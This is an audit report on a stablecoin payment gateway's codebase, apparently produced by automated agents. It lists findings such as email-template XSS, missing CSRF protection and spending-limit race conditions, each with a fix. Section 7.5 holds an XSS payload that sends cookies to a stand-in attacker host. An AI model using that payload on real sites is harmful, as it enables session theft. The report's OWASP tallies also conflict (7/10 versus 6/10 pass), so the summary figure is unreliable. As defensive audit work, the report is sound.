# StableFlow Stablecoin Gateway — Audit Report (v9)

**Date:** February 2, 2026
**Auditor:** ConnectSW Code Reviewer (Automated, 4-agent parallel exploration)
**Branch:** main (post-PR #88 merge — E2E Playwright improvements, CORS fix)
**Product Version:** v1.2.0-rc (Phase 1 features: Payment Links, QR Codes, Checkout Widget, Email Notifications)
**Previous Audit:** v8 (same date, pre-PR #88)

---

# PART A — EXECUTIVE MEMO

---

## Section 0: Methodology and Limitations

### Audit Scope

| Directory Scanned | File Types |
|---|---|
| `apps/api/src/services/` | `.ts` |
| `apps/api/src/workers/` | `.ts` |
| `apps/api/src/routes/` | `.ts` |
| `apps/api/src/plugins/` | `.ts` |
| `apps/api/src/utils/` | `.ts` |
| `apps/api/src/app.ts` | `.ts` |
| `apps/api/prisma/` | `.prisma` |
| `apps/api/tests/` | `.ts` |
| `apps/web/src/` | `.ts`, `.tsx` |
| `apps/web/e2e/` | `.ts` |
| `.github/workflows/` | `.yml` |
| Root configs | `.json`, `.yml`, `.env*` |

- **Total files reviewed:** 114 source files + 105 test files = 219 files
- **Total lines of code analyzed:** 18,495 (source) + ~16,000 (tests) = ~34,500 lines
- **Backend source files:** 51 files
- **Frontend source files:** 61 files
- **Test files:** 105 files

### Methodology

- Static analysis: manual code review of all source files by 4 parallel agents
- Schema analysis: Prisma schema, database indexes, relations
- Dependency audit: `package.json` and lock file review
- Configuration review: environment files, Docker configs, CI/CD pipelines
- Test analysis: execution of full test suite, coverage assessment, gap identification
- Architecture review: dependency graph, layering, coupling analysis

### Test Execution Results

| Suite | Files | Pass | Fail | Skip |
|---|---|---|---|---|
| Backend (Jest) | 104 | 951 | 0 | 1 |
| Frontend Unit (Jest) | 24 | 160 | 0 | 0 |
| E2E (Playwright) | 14 | 73 | 0 | 0 |
| **Total** | **142** | **1,184** | **0** | **1** |

Pass rate: 99.9% (1 intentionally skipped test for token revocation)

### Out of Scope

- Dynamic penetration testing (no live exploit attempts)
- Runtime performance profiling (no load tests)
- Third-party SaaS integrations (only code-level integration points)
- Infrastructure-level security (cloud IAM, network policies)
- Generated code (Prisma client) unless it poses a security risk
- Third-party library internals (vulnerable versions are noted)
- Blockchain on-chain testing (smart contract interactions reviewed in code only)
- Frontend accessibility (WCAG compliance not assessed)

### Limitations

- This audit is based on static code review. Some issues (memory leaks, race conditions under load, intermittent failures) may only manifest at runtime.
- Compliance assessments are technical gap analyses, not formal certifications.
- Scores reflect the state of the code at the time of audit and may change with subsequent commits.

---

## Section 1: Executive Decision Summary

### Overall Assessment: CONDITIONALLY PRODUCTION-READY

| Question | Answer |
|----------|--------|
| **Can this go to production?** | Conditionally — after Phase 0 items are resolved |
| **Is it salvageable?** | Yes — the product is well-architected and functional |
| **Risk if ignored** | High — several exploitable vulnerabilities exist in authentication and payment flows |
| **Recovery effort** | 2-3 weeks with 2 engineers for Phase 0 + Phase 1 |
| **Enterprise-ready?** | No — CSRF protection, CSP hardening, and token handling need work |
| **Compliance-ready?** | SOC2: No (token handling, CSRF). OWASP Top 10: Partial (7/10 pass, 3 partial) |

### Top 5 Risks in Plain Language

1. **An attacker could inject malicious content into payment notification emails** — Email templates do not sanitize merchant names or payment descriptions before rendering them as HTML, allowing script injection that could steal credentials from email clients.

2. **Two payment requests arriving simultaneously could exceed a merchant's spending limit** — The system checks the spending limit and records the spend in separate steps, creating a window where parallel requests both pass the check before either is recorded.

3. **An attacker could determine which email addresses have accounts** — The signup endpoint returns different error messages for "email already exists" vs. other failures, allowing enumeration of registered merchants.

4. **Session tokens are not protected against cross-site request forgery** — The API has no CSRF protection, meaning a malicious website could trick a logged-in merchant's browser into making unauthorized API calls.

5. **Development debugging endpoints are accessible without authentication** — The dev routes expose database seeding and state inspection capabilities with no access controls, which could be exploited if accidentally deployed.

---

## Section 2: Stop / Fix / Continue

| Category | Items |
|----------|-------|
| **STOP** | Deploying with dev routes enabled in production. Sending unsanitized merchant data in email HTML templates. |
| **FIX** | CSRF protection must be added before production. Refresh tokens must move to httpOnly cookies. Spending limit race condition must use atomic check-and-decrement. Email enumeration on signup must return generic responses. CSP must remove unsafe-inline for scripts. |
| **CONTINUE** | Decimal.js precision for financial calculations. Idempotency key pattern for payment processing. HMAC-based API key hashing. Structured audit logging. Comprehensive behavioral test suite (951 backend tests). Webhook signature verification with timing-safe comparison. Payment state machine with valid transitions. |

---

## Section 3: System Overview

### Architecture

```
                    ┌─────────────┐
                    │   Merchant   │
                    │   Browser    │
                    └──────┬───────┘
                           │ HTTPS
                    ┌──────▼───────┐
                    │  Next.js 14  │  Port 3104
                    │  Frontend    │  React 18 + Tailwind
                    └──────┬───────┘
                           │ REST API
                    ┌──────▼───────┐
                    │  Fastify     │  Port 5001
                    │  Backend API │  TypeScript + Prisma
                    └──┬───┬───┬──┘
                       │   │   │
            ┌──────────┘   │   └──────────┐
            ▼              ▼              ▼
     ┌──────────┐   ┌──────────┐   ┌──────────┐
     │PostgreSQL│   │  Redis   │   │Blockchain│
     │  (Prisma)│   │ (Cache,  │   │  (RPC)   │
     │          │   │  Locks)  │   │  Ethers  │
     └──────────┘   └──────────┘   └──────────┘
```

### Technology Stack

- **Runtime:** Node.js 20+, TypeScript 5+
- **Backend:** Fastify with JWT auth, rate limiting, CORS
- **Frontend:** Next.js 14, React 18, Tailwind CSS
- **Database:** PostgreSQL 15+ via Prisma ORM
- **Cache/Locks:** Redis (circuit breaker, nonce locks, rate limiting)
- **Blockchain:** ethers.js for EVM-compatible chains (Ethereum, Polygon, BSC)
- **Crypto:** AES-256-GCM encryption, HMAC-SHA256 API keys, bcrypt passwords
- **Testing:** Jest (951 backend, 160 frontend), Playwright (73 E2E)

### Key Flows

1. **Payment Flow:** Merchant creates payment via API -> system generates payment link -> customer pays on-chain -> blockchain monitor detects transfer -> webhook notifies merchant
2. **Auth Flow:** Email/password signup -> JWT access token (15min) + refresh token -> token rotation on refresh
3. **Refund Flow:** Merchant requests refund -> spending limit check -> nonce lock -> blockchain transaction -> confirmation monitoring -> webhook notification

---

## Section 4: Critical Issues (Top 10)

### 1. XSS in Email HTML Templates

- **Severity:** Critical
- **Likelihood:** High — any merchant can set their business name
- **Blast Radius:** Organization — all email recipients affected
- **Risk Owner:** Dev
- **Category:** Code
- **Business Impact:** An attacker registering as a merchant could inject scripts into emails sent to customers, potentially stealing credentials or redirecting payments
- **Compliance Impact:** OWASP A03 (Injection), SOC2 Processing Integrity

### 2. Spending Limit Check-Then-Spend Race Condition

- **Severity:** Critical
- **Likelihood:** Medium — requires concurrent requests
- **Blast Radius:** Product — financial loss per merchant
- **Risk Owner:** Dev
- **Category:** Code
- **Business Impact:** Parallel payment requests could exceed configured spending limits, leading to unauthorized fund outflows that violate merchant agreements
- **Compliance Impact:** SOC2 Processing Integrity, ISO 27001 A.14

### 3. No CSRF Protection

- **Severity:** Critical
- **Likelihood:** Medium — requires social engineering
- **Blast Radius:** Product — any authenticated merchant action
- **Risk Owner:** Dev
- **Category:** Code
- **Business Impact:** A malicious website could trick a merchant's browser into initiating payments, changing settings, or creating API keys without the merchant's knowledge
- **Compliance Impact:** OWASP A01 (Broken Access Control), SOC2 Security

### 4. User Signup Email Enumeration

- **Severity:** High
- **Likelihood:** High — trivially exploitable via automated scripts
- **Blast Radius:** Organization — exposes user base
- **Risk Owner:** Dev
- **Category:** Code
- **Business Impact:** Attackers could build a list of registered merchant emails for targeted phishing campaigns or competitive intelligence
- **Compliance Impact:** OWASP A07 (Identification and Authentication Failures)

### 5. Refresh Tokens in JSON Body Instead of httpOnly Cookies

- **Severity:** High
- **Likelihood:** Medium — requires XSS or malicious browser extension
- **Blast Radius:** Feature — session hijacking per user
- **Risk Owner:** Dev
- **Category:** Code
- **Business Impact:** If any XSS is found (see issue 1), refresh tokens stored in JavaScript-accessible memory can be exfiltrated, giving persistent access to merchant accounts
- **Compliance Impact:** OWASP A07, SOC2 Security

### 6. CSP Allows unsafe-inline for Scripts

- **Severity:** High
- **Likelihood:** Medium — amplifies any XSS vector
- **Blast Radius:** Product — browser security bypass
- **Risk Owner:** Dev
- **Category:** Code
- **Business Impact:** The Content Security Policy does not block inline scripts, removing a critical defense layer against cross-site scripting attacks on the merchant dashboard
- **Compliance Impact:** OWASP A05 (Security Misconfiguration)

### 7. Dev Routes Accessible Without Authentication

- **Severity:** High
- **Likelihood:** Low in production if disabled, High if accidentally deployed
- **Blast Radius:** Organization — full database access
- **Risk Owner:** DevOps
- **Category:** Code / Process
- **Business Impact:** If development routes reach production, anyone could seed test data, inspect internal state, or manipulate the database without any credentials
- **Compliance Impact:** OWASP A01, OWASP A05, SOC2 Security

### 8. Nonce Lock Fallback TOCTOU Race

- **Severity:** High
- **Likelihood:** Low — requires Redis failure during active transaction
- **Blast Radius:** Product — duplicate blockchain transactions
- **Risk Owner:** Dev
- **Category:** Code
- **Business Impact:** If Redis is unavailable, the nonce manager falls back to a database check-then-use pattern that could assign the same nonce to two transactions, causing one to fail and potentially losing funds in gas fees
- **Compliance Impact:** SOC2 Processing Integrity

### 9. Encryption Key SHA-256 Hashing

- **Severity:** Medium
- **Likelihood:** Low — defense-in-depth concern
- **Blast Radius:** Product — weakened encryption key derivation
- **Risk Owner:** Dev
- **Category:** Code
- **Business Impact:** The encryption utility hashes a valid 256-bit key through SHA-256 unnecessarily, which does not weaken the key but adds unnecessary complexity and could mask future key derivation bugs
- **Compliance Impact:** OWASP A02 (Cryptographic Failures)

### 10. Dual PrismaClient Instances

- **Severity:** Medium
- **Likelihood:** High — happens on every request
- **Blast Radius:** Feature — connection pool exhaustion
- **Risk Owner:** Dev
- **Category:** Architecture
- **Business Impact:** Two separate Prisma clients maintain independent connection pools to the same database, doubling resource consumption and potentially causing connection exhaustion under load
- **Compliance Impact:** SOC2 Availability

---

## Section 5: Risk Register (Summary)

| Issue ID | Title | Severity | Owner | SLA |
|----------|-------|----------|-------|-----|
| RISK-001 | XSS in email HTML templates | Critical | Dev | Phase 0 (48h) |
| RISK-002 | Spending limit race condition | Critical | Dev | Phase 0 (48h) |
| RISK-003 | No CSRF protection | Critical | Dev | Phase 1 (1-2w) |
| RISK-004 | Signup email enumeration | High | Dev | Phase 0 (48h) |
| RISK-005 | Refresh tokens not in httpOnly cookies | High | Dev | Phase 1 (1-2w) |
| RISK-006 | CSP unsafe-inline for scripts | High | Dev | Phase 1 (1-2w) |
| RISK-007 | Dev routes no auth | High | DevOps | Phase 0 (48h) |
| RISK-008 | Nonce lock TOCTOU race | High | Dev | Phase 1 (1-2w) |
| RISK-009 | Encryption key SHA-256 hashing | Medium | Dev | Phase 2 (2-4w) |
| RISK-010 | Dual PrismaClient instances | Medium | Dev | Phase 1 (1-2w) |
| RISK-011 | Webhook worker error message leakage | Medium | Dev | Phase 1 (1-2w) |
| RISK-012 | Payment link usage count race | Medium | Dev | Phase 1 (1-2w) |
| RISK-013 | Checkout exposes merchant wallet address | Medium | Dev | Phase 1 (1-2w) |
| RISK-014 | Rate limit keyGenerator timing | Medium | Dev | Phase 2 (2-4w) |
| RISK-015 | Redis no auth in Docker | Medium | DevOps | Phase 1 (1-2w) |
| RISK-016 | Swagger UI in production | Medium | DevOps | Phase 0 (48h) |
| RISK-017 | Refund worker FOR UPDATE outside transaction | Medium | Dev | Phase 1 (1-2w) |
| RISK-018 | Admin search unbounded | Medium | Dev | Phase 2 (2-4w) |
| RISK-019 | Redis circuit breaker module-level state | Medium | Dev | Phase 2 (2-4w) |
| RISK-020 | Refund amount precision loss at boundary | Medium | Dev | Phase 1 (1-2w) |
| RISK-021 | Webhook event ID weak randomness | Low | Dev | Phase 2 (2-4w) |
| RISK-022 | Missing ownership check on payment status update | Low | Dev | Phase 1 (1-2w) |
| RISK-023 | No frontend component tests | Low | Dev | Phase 2 (2-4w) |
| RISK-024 | CI missing SAST and secret scanning | Low | DevOps | Phase 2 (2-4w) |
| RISK-025 | Param IDs not validated as UUID across routes | Low | Dev | Phase 2 (2-4w) |
| RISK-026 | env-validator calls process.exit(1) | Low | Dev | Phase 3 (4-8w) |
| RISK-027 | No max refund amount validation | Low | Dev | Phase 2 (2-4w) |
| RISK-028 | Metrics endpoint not timing-safe | Low | Dev | Phase 3 (4-8w) |
| RISK-029 | Response format inconsistencies | Low | Dev | Phase 3 (4-8w) |
| RISK-030 | SSE tests timing-dependent | Low | Dev | Phase 3 (4-8w) |

**Total: 30 findings** (3 Critical, 5 High, 12 Medium, 10 Low)

---

## Scores

### Technical Dimension Scores

| Dimension | Score | Notes |
|-----------|-------|-------|
| Security | 6.5/10 | XSS, CSRF, email enumeration, CSP gaps. Strong: HMAC keys, bcrypt, AES-256-GCM, timing-safe HMAC |
| Architecture | 8/10 | Clean layering, service pattern, state machine. Weak: dual Prisma, module-level Redis state |
| Test Coverage | 8.5/10 | 1,184 tests, behavioral testing, race condition tests. Weak: no frontend component tests, 1 skip |
| Code Quality | 8/10 | TypeScript throughout, Decimal.js, idempotency. Weak: some race conditions in financial paths |
| Performance | 7/10 | Dual Prisma pools, unbounded admin queries. Strong: Redis caching, connection management |
| DevOps | 6.5/10 | No SAST, no secret scanning, Redis no auth. Strong: CI pipeline, Docker, health checks |
| Runability | 8/10 | Full stack starts, 1,184 tests pass, real data flows. Minor: Jest does not exit cleanly (open handles) |

**Technical Score: 7.5/10**

### Readiness Scores

| Dimension | Score | Notes |
|-----------|-------|-------|
| Security Readiness | 6/10 | CSRF and XSS gaps block production deployment for regulated use |
| Product Potential | 8.5/10 | Solid domain logic, comprehensive features, good patterns |
| Enterprise Readiness | 6/10 | CSRF, CSP, token handling, and compliance gaps block enterprise onboarding |

### Overall Score: 7.1/10 — Needs Work Before Production

---

## Compliance Summary

### OWASP Top 10

| Control | Status |
|---------|--------|
| A01: Broken Access Control | Partial — CSRF missing, dev routes |
| A02: Cryptographic Failures | Pass — AES-256-GCM, bcrypt, HMAC |
| A03: Injection | Partial — XSS in email templates |
| A04: Insecure Design | Pass — state machine, idempotency |
| A05: Security Misconfiguration | Partial — CSP unsafe-inline, Swagger in prod |
| A06: Vulnerable Components | Pass — no known vulnerable dependencies |
| A07: Auth Failures | Partial — email enumeration, token handling |
| A08: Software Integrity | Pass — webhook signatures, HMAC verification |
| A09: Logging Failures | Pass — structured audit logging, log sanitization |
| A10: SSRF | Pass — comprehensive URL validation with DNS timeout |

**Result: 6/10 Pass, 4/10 Partial, 0/10 Fail**

### SOC2 Type II

| Principle | Status |
|-----------|--------|
| Security | Partial — CSRF, CSP, token handling gaps |
| Availability | Partial — dual Prisma pools, no connection pool monitoring |
| Processing Integrity | Partial — spending limit race, nonce TOCTOU |
| Confidentiality | Pass — encryption at rest, log sanitization, HMAC keys |
| Privacy | Pass — no PII exposure in logs, audit trail |

### ISO 27001

| Control Area | Status |
|-------------|--------|
| A.9 Access Control | Partial — CSRF, dev routes |
| A.10 Cryptography | Pass |
| A.12 Operations Security | Partial — no SAST, no secret scanning |
| A.14 System Development | Partial — race conditions in financial logic |

---

## Remediation Phases (Summary)

**Phase 0 (48 hours):** Sanitize email templates, fix spending limit race condition, fix email enumeration, disable dev routes in production, disable Swagger in production.

**Phase 1 (1-2 weeks):** Add CSRF protection, move refresh tokens to httpOnly cookies, harden CSP, fix nonce lock fallback, consolidate PrismaClient, add Redis auth, fix refund worker locking, fix payment link usage race, fix error message leakage.

**Phase 2 (2-4 weeks):** Add SAST and secret scanning to CI, add frontend component tests, fix rate limit keyGenerator timing, add UUID validation on route params, fix webhook event ID randomness, add max refund amount validation.

**Phase 3 (4-8 weeks):** Fix env-validator process.exit, add metrics endpoint protection, standardize response formats, fix SSE test flakiness, add load testing.

---

# PART B — ENGINEERING APPENDIX

(This section contains file:line references, code examples, and technical detail. For engineering team only.)

---

## Section 6: Architecture Problems

### 6.1 Dual PrismaClient Instances

**Location:** `apps/api/src/utils/index.ts:44-46` and the Prisma plugin

Two independent PrismaClient instances are created — one in the utils barrel export and one in the Prisma Fastify plugin. Each maintains its own connection pool, doubling database connections. Under load, this can exhaust PostgreSQL's `max_connections`.

**Fix:** Export a singleton PrismaClient from a dedicated module and import it in both locations.

### 6.2 Redis Circuit Breaker Module-Level State

**Location:** `apps/api/src/plugins/auth.ts:10-11`

The Redis circuit breaker state (failure count, last failure time) is stored in module-level variables. In a multi-instance deployment behind a load balancer, each instance tracks its own circuit state independently, leading to inconsistent circuit breaker behavior.

**Fix:** Store circuit breaker state in Redis itself (atomic increment with TTL), or accept per-instance behavior and document the limitation.

### 6.3 Rate Limit KeyGenerator Timing Issue

**Location:** `apps/api/src/app.ts:153-167`

The rate limit keyGenerator runs before the auth plugin decorates `request.currentUser`. The generator attempts to use `request.currentUser` for per-user rate limiting but falls back to IP. This means authenticated rate limiting does not work as intended.

**Fix:** Register the rate limit plugin after the auth plugin, or use a `preHandler` hook instead of the `keyGenerator` function.

### 6.4 env-validator Calls process.exit(1)

**Location:** `apps/api/src/utils/env-validator.ts`

The environment validator calls `process.exit(1)` on validation failure. This prevents graceful shutdown, skips `finally` blocks, and makes the function untestable in isolation.

**Fix:** Throw an error instead of calling `process.exit`. Let the application entry point handle the process exit decision.

---

## Section 7: Security Findings

### Authentication and Authorization

#### 7.1 No CSRF Protection (Critical)

**Location:** `apps/api/src/app.ts` (entire file — no CSRF plugin registered)

The Fastify application registers CORS with credentials support but does not implement any CSRF protection (no CSRF tokens, no SameSite cookie enforcement, no Origin/Referer checking). Any cross-origin site can make authenticated requests if the user has an active session.

**Exploit Scenario:**
1. Merchant logs into dashboard at `app.stableflow.com`
2. Merchant visits `evil-site.com` in another tab
3. `evil-site.com` makes a `POST /v1/payments` request — browser attaches cookies automatically
4. Payment is created without merchant's knowledge

**Fix:**
```typescript
// Option 1: CSRF token via @fastify/csrf-protection
import csrf from '@fastify/csrf-protection';
await app.register(csrf, { cookieOpts: { signed: true, sameSite: 'strict' } });

// Option 2: Double-submit cookie pattern
// Set a CSRF cookie and require it in X-CSRF-Token header
```

#### 7.2 Email Enumeration on Signup (High)

**Location:** `apps/api/src/routes/auth.ts:50-51`

The signup endpoint returns a specific error message "Email already exists" when a duplicate email is submitted. An attacker can enumerate valid accounts by iterating email addresses.

**Fix:**
```typescript
// Instead of: reply.code(409).send({ error: 'Email already exists' });
// Use: reply.code(200).send({ message: 'If this email is available, a verification email has been sent.' });
```

#### 7.3 Dev Routes Without Authentication (High)

**Location:** `apps/api/src/routes/dev.ts:10-95`

All routes in the dev router are registered without any authentication guard. The routes expose database seeding, state inspection, and test data creation. While presumably gated by a `NODE_ENV` check, no such guard is visible in the route registration.

**Fix:** Add explicit environment check at the top of the plugin:
```typescript
if (process.env.NODE_ENV === 'production') {
  return; // Do not register dev routes in production
}
```

#### 7.4 Refresh Tokens in JSON Response Body (High)

**Location:** `apps/api/src/routes/auth.ts:224-225`

Refresh tokens are returned in the JSON response body and stored in the frontend's in-memory state. While in-memory storage is better than localStorage, the token is still accessible to JavaScript and vulnerable to XSS.

**Fix:** Set refresh token as an httpOnly, secure, SameSite=strict cookie:
```typescript
reply.setCookie('refresh_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  path: '/v1/auth/refresh',
  maxAge: 7 * 24 * 60 * 60 // 7 days
});
```

### Injection Vulnerabilities

#### 7.5 XSS in Email HTML Templates (Critical)

**Location:** `apps/api/src/services/email.service.ts:300, 310, 314, 326-330`

Merchant names, payment descriptions, and amounts are interpolated directly into HTML email templates using template literals without escaping. A merchant who sets their business name to `<script>alert(1)</script>` or `<img src=x onerror=fetch('evil.com?c='+document.cookie)>` could inject arbitrary HTML into emails sent to customers.

**Fix:**
```typescript
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Apply to all user-controlled values before HTML interpolation
const safeName = escapeHtml(merchant.businessName);
```

### Data Security

#### 7.6 Webhook Worker Error Message Leakage (Medium)

**Location:** `apps/api/src/workers/webhook-worker.ts:79`

When internal webhook delivery fails, the error message from the failed HTTP request is included in the response to the calling service. This can leak internal hostnames, port numbers, and network topology.

**Fix:** Log the full error internally but return a generic "Webhook delivery failed" message.

#### 7.7 Checkout Exposes Merchant Wallet Address (Medium)

**Location:** `apps/api/src/routes/checkout.ts`

The public checkout endpoint returns the merchant's blockchain wallet address in the response. While necessary for payment, this allows anyone to look up the merchant's full transaction history on-chain.

**Fix:** Use a per-payment intermediary address or document this as an accepted risk with merchant consent.

### API Security

#### 7.8 Swagger UI Accessible in Production (Medium)

**Location:** `apps/api/src/app.ts:225-227`

The Swagger documentation UI is registered without an environment check. In production, this exposes the complete API schema including internal endpoints, parameter types, and error formats.

**Fix:** Gate behind environment check or require authentication for Swagger access.

#### 7.9 Admin Search Unbounded (Medium)

**Location:** `apps/api/src/routes/admin.ts`

The admin search endpoint does not enforce a maximum page size. An attacker with admin credentials could request all records in a single query, causing database and memory pressure.

**Fix:** Enforce `Math.min(requestedPageSize, 100)` on all paginated endpoints.

---

## Section 8: Performance and Scalability

### 8.1 Dual PrismaClient Connection Pools

**Location:** `apps/api/src/utils/index.ts:44-46`

Two PrismaClient instances each default to `connection_limit=5` in serverless or `connection_limit=10` in traditional deployment. This wastes 50% of available connections.

**Impact:** At scale with multiple server instances, database connections will be exhausted faster than expected.

### 8.2 Spending Limit Check-Then-Spend Pattern

**Location:** `apps/api/src/services/blockchain-transaction.service.ts:224-258`

The spending limit is read, compared, and then a separate write updates the spent amount. Under concurrent requests, the read-check-write pattern allows multiple requests to pass the check before any write completes.

**Fix:** Use an atomic `UPDATE ... SET spent = spent + amount WHERE spent + amount <= limit RETURNING *` query, or use `SELECT ... FOR UPDATE` within a serializable transaction.

### 8.3 Refund Worker FOR UPDATE Outside Transaction

**Location:** `apps/api/src/workers/refund-processing.worker.ts:78-84`

The `FOR UPDATE` lock on the refund record is acquired outside a transaction boundary. This means the lock is released immediately after the SELECT, providing no protection against concurrent processing.

**Fix:** Wrap the entire refund processing flow in a `prisma.$transaction()` block.

### 8.4 Payment Link Usage Count Race

**Location:** `apps/api/src/services/payment-link.service.ts`

The payment link service reads the current usage count, checks against the limit, and then increments. Concurrent requests can both pass the limit check.

**Fix:** Use `UPDATE payment_links SET usage_count = usage_count + 1 WHERE id = $1 AND usage_count < max_uses RETURNING *`.

---

## Section 9: Testing Gaps

### Coverage Assessment

| Area | Estimated Coverage | Notes |
|------|-------------------|-------|
| Backend services | 85-90% | Strong behavioral testing, race condition tests |
| Backend routes | 75-80% | Good coverage but missing some error paths |
| Frontend components | < 10% | Only lib/ utility functions tested, no component tests |
| Frontend pages | 0% | No page-level tests |
| E2E flows | 70% | 73 tests covering auth, payments, webhooks, admin |
| Security tests | 60% | Good: HMAC, encryption, sanitization. Missing: CSRF, XSS |

### Missing Test Scenarios

1. **No frontend component tests** — React components have zero unit tests. Only utility functions in `lib/` are tested.
2. **No CSRF attack simulation** — No test verifies that cross-origin requests are rejected.
3. **No concurrent request tests at API level** — Race conditions are tested at service level but not at HTTP level.
4. **Token revocation test skipped** — `tests/services/auth-token-revocation.test.ts` has 1 skipped test.
5. **SSE tests are timing-dependent** — Tests rely on `setTimeout` for event timing, causing intermittent failures in CI.
6. **No load testing** — No performance benchmarks or stress tests exist.

### Brittle Tests

- SSE rate limit tests use fixed timeouts that may fail under CI load
- Tests using `beforeAll` to delete all records can interfere with parallel test files (mitigated by `maxWorkers: 1`)
- Jest does not exit cleanly after test runs (open handles from database connections)

---

## Section 10: DevOps Issues

### 10.1 No SAST or Secret Scanning in CI

**Location:** `.github/workflows/`

The CI pipeline runs linting, type checking, and tests but does not include static application security testing (SAST) or secret scanning. Known vulnerable patterns and accidentally committed secrets would not be caught.

**Fix:** Add `npm audit --audit-level=high` and a tool like `gitleaks` or GitHub's built-in secret scanning.

### 10.2 Redis Without Authentication

**Location:** `docker-compose.yml`

The Redis instance in Docker is configured without `requirepass`. In development this is acceptable, but the same configuration pattern may be replicated to staging/production.

**Fix:** Add `requirepass` to Redis configuration and update connection strings.

### 10.3 No Rollback Strategy Documented

No runbook or automated rollback mechanism is documented. If a deployment causes issues, the recovery procedure is undefined.

**Fix:** Document rollback procedure and implement health-check-based automatic rollback in deployment pipeline.

### 10.4 Jest Open Handles

**Location:** All test runs

Jest reports "did not exit one second after the test run has completed" due to unclosed database connections. This slows CI and can cause hanging builds.

**Fix:** Add `afterAll` hooks to disconnect Prisma clients, or use `--forceExit` as a temporary workaround while fixing root causes.

---

## Section 11: Compliance Readiness

### OWASP Top 10 (2021) — Control-by-Control

| Control | Status | Evidence / Gap |
|---------|--------|----------------|
| A01: Broken Access Control | Partial | No CSRF protection (`apps/api/src/app.ts`). Dev routes without auth (`routes/dev.ts`). Missing ownership check on payment status update. |
| A02: Cryptographic Failures | Pass | AES-256-GCM with random IV (`utils/encryption.ts`). Bcrypt password hashing. HMAC-SHA256 API key storage. Minor: unnecessary SHA-256 of encryption key (`encryption.ts:66`). |
| A03: Injection | Partial | XSS in email templates (`services/email.service.ts:300-330`). Prisma ORM prevents SQL injection. No raw queries found. |
| A04: Insecure Design | Pass | Payment state machine with valid transitions. Idempotency keys for payment processing. Rate limiting on endpoints. Account lockout after failed attempts. |
| A05: Security Misconfiguration | Partial | CSP allows `unsafe-inline` for scripts (`app.ts:67`). Swagger UI accessible in production (`app.ts:225-227`). `trustProxy: true` without IP validation. |
| A06: Vulnerable and Outdated Components | Pass | No known vulnerable dependencies in current `package-lock.json`. All major dependencies on recent versions. |
| A07: Identification and Authentication Failures | Partial | Email enumeration on signup (`routes/auth.ts:50-51`). Refresh tokens in JSON body instead of httpOnly cookies (`routes/auth.ts:224-225`). Strong: JWT algorithm pinning, account lockout, token rotation. |
| A08: Software and Data Integrity Failures | Pass | HMAC webhook signatures with timing-safe comparison. API key verification via HMAC. No unsafe deserialization patterns found. |
| A09: Security Logging and Monitoring Failures | Pass | Structured audit logging for all sensitive operations. Log sanitization removes PII and secrets. Audit trail for authentication events. |
| A10: Server-Side Request Forgery (SSRF) | Pass | Comprehensive SSRF protection on webhook URLs with private IP blocking, DNS resolution validation, and DNS timeout (added in PR #86). |

### SOC2 Type II — Trust Service Principles

| Principle | Status | Evidence / Gap |
|-----------|--------|----------------|
| Security (Common Criteria) | Partial | Encryption at rest (AES-256-GCM), HMAC API keys, bcrypt passwords, JWT auth. Gaps: CSRF missing, CSP unsafe-inline, dev routes, email enumeration. |
| Availability | Partial | Health check endpoints, Redis circuit breaker. Gaps: dual Prisma pools risk connection exhaustion, no documented rollback strategy, no load testing baseline. |
| Processing Integrity | Partial | Decimal.js for financial precision, payment state machine, idempotency keys. Gaps: spending limit race condition, nonce lock TOCTOU, refund precision loss at boundary. |
| Confidentiality | Pass | Encryption at rest for sensitive data, log sanitization, HMAC key storage, audit trail. Webhook secrets encrypted with AES-256-GCM. |
| Privacy | Pass | No PII in logs (sanitization active), audit trail captures access events, no unnecessary data collection. |

### ISO 27001 Annex A — Key Controls

| Control Area | Status | Evidence / Gap |
|-------------|--------|----------------|
| A.5 Information Security Policies | Partial | Security patterns in code but no formal security policy document in repository. |
| A.6 Organization of Information Security | Pass | Clear code ownership, agent-based development with review gates. |
| A.8 Asset Management | Pass | Database schema well-defined, data classification implicit in encryption decisions. |
| A.9 Access Control | Partial | JWT-based access control, role-based routes. Gaps: CSRF, dev routes, missing ownership checks. |
| A.10 Cryptography | Pass | AES-256-GCM, HMAC-SHA256, bcrypt. Industry-standard algorithms with proper key lengths. |
| A.12 Operations Security | Partial | CI pipeline exists, Docker deployment. Gaps: no SAST, no secret scanning, no monitoring/alerting. |
| A.14 System Development | Partial | 1,184 tests, TDD approach, code review. Gaps: race conditions in financial logic, no security testing in CI. |
| A.16 Incident Management | Partial | Audit logging exists. Gap: no incident response runbook, no alerting pipeline. |
| A.18 Compliance | Partial | This audit provides gap analysis. No formal compliance program in place. |

---

## Section 12: Technical Debt Map

| Priority | Debt Item | Interest (cost of delay) | Owner | Payoff |
|----------|-----------|--------------------------|-------|--------|
| HIGH | CSRF protection missing | Every day without it is a day the app is vulnerable to cross-site attacks | Dev | Eliminates entire attack class |
| HIGH | Email template XSS | Any merchant signup can create exploit emails immediately | Dev | Protects all email recipients |
| HIGH | Spending limit race condition | Financial loss accumulates with each concurrent request that bypasses limits | Dev | Guarantees spending limit accuracy |
| HIGH | Refresh token handling | XSS discovery becomes session hijacking vector | Dev | Reduces blast radius of any future XSS |
| MEDIUM | Dual PrismaClient | Connection exhaustion risk grows with traffic | Dev | 50% reduction in database connections |
| MEDIUM | Frontend component test coverage | Every UI change is unverified; regressions ship silently | Dev | Catches UI regressions before production |
| MEDIUM | CI security scanning | Vulnerable dependencies and secrets go undetected | DevOps | Automated vulnerability detection |
| MEDIUM | Redis authentication | Lateral movement after any container compromise | DevOps | Network-level security improvement |
| LOW | Response format inconsistencies | API consumers must handle multiple response shapes | Dev | Cleaner API contract |
| LOW | Jest open handles | CI builds hang, wasting resources | Dev | Faster, more reliable CI |
| LOW | env-validator process.exit | Untestable startup validation, ungraceful shutdown | Dev | Testable, composable startup |

---

## Section 13: Remediation Roadmap (Phased)

### Phase 0 — Immediate (48 hours)

| Item | Owner | Verification |
|------|-------|-------------|
| Sanitize all user-controlled values in email HTML templates with HTML entity escaping | Dev | Run `tests/services/email.test.ts` — add test with `<script>` in merchant name |
| Fix spending limit to use atomic check-and-decrement query | Dev | Run `tests/services/spending-limit-atomicity.test.ts` with concurrent request simulation |
| Return generic response on signup regardless of email existence | Dev | Run `tests/routes/auth.test.ts` — verify same response for new and existing emails |
| Add `NODE_ENV === 'production'` guard to dev routes plugin | DevOps | Verify dev routes return 404 when `NODE_ENV=production` |
